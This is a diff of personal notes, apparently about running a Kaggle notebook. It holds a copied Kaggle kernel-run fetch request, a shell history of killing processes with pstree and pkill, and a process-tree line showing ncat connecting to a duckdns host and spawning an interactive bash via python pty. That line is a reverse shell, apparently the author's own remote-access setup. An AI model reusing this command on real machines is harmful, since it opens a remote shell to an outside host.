@@ -7,3 +7,42 @@ curl 'https://www.kaggle.com/requests/CreateKernelRunRequest' -H 'cookie: ka_ses
 fetch("https://www.kaggle.com/requests/CreateKernelRunRequest", {"credentials":"include","headers":{},"referrer":"https://www.kaggle.com/k1gaggle/jigsaw-multilingual-toxicity-eda-models/edit/run/34120418","referrerPolicy":"strict-origin-when-cross-origin","body":"{\"forkedFromKernelId\":null,\"kernelVersionId\":null,\"dockerImageVersionId\":null,\"pinnedDockerImageVersionId\":null,\"ipynbContents\":null,\"diff\":null,\"forkParentDiff\":null,\"versionType\":\"interactive\",\"kernelId\":9350196,\"title\":\"Jigsaw Multilingual Toxicity : EDA + Models 🤬\",\"languageId\":8,\"dockerImageTag\":null,\"workerPoolName\":null,\"dataSources\":[{\"sourceType\":\"Competition\",\"sourceId\":19018,\"databundleVersionId\":1053282,\"mountSlug\":\"jigsaw-multilingual-toxic-comment-classification\"},{\"sourceType\":\"DatasetVersion\",\"sourceId\":1166112,\"databundleVersionId\":null,\"mountSlug\":\"jigsaw-multilingula-toxicity-token-encoded\"}],\"compute\":{\"accelerator\":\"tpu_v3_8\",\"internet\":{\"isEnabled\":true},\"constraints\":null},\"useGivenDataSourceVersionIds\":false}","method":"POST","mode":"cors"});
 
 # create kernel run request
+
+clean_exit:
+   19  kill 5216
+   20  ps aux | grep make
+   21  pstree
+   22  pstree -p
+   23  clear
+   24  vi Makefile
+   25  pstree -spa $$
+   26  make clean
+   27  pstree
+   28  pstree -a
+   29  fg
+   30  make clean
+   31  ls
+   32  pstree
+   33  pstree -a
+   34  pkill -f "mosh_server"
+   35  pstree
+   36  pstree -a
+   37  pkill -f "23455"
+   38  pstree -a
+   39  echo $$
+   40  clear
+   41  clear
+   42  ls
+   43  tig
+   44  pstree -laps
+   45  pkill -f "60001"
+   46  pstree -laps
+   47  pkill -f "60002"
+   48  pstree
+   49  pkill -f "sleep"
+   50  pstree
+   51  history
+pkill mosh-server
+├─ncat,4829 -w 15s -i 1800s vtool.duckdns.org 9087 -c echo Sat May 23 10:57:25 UTC 2020 started connection; echo fff55010d916; python -c 'import pty; pty.spawn(["/bin/bash", "-li"])'
+kill net ncat which spwan the pty at last ~
+
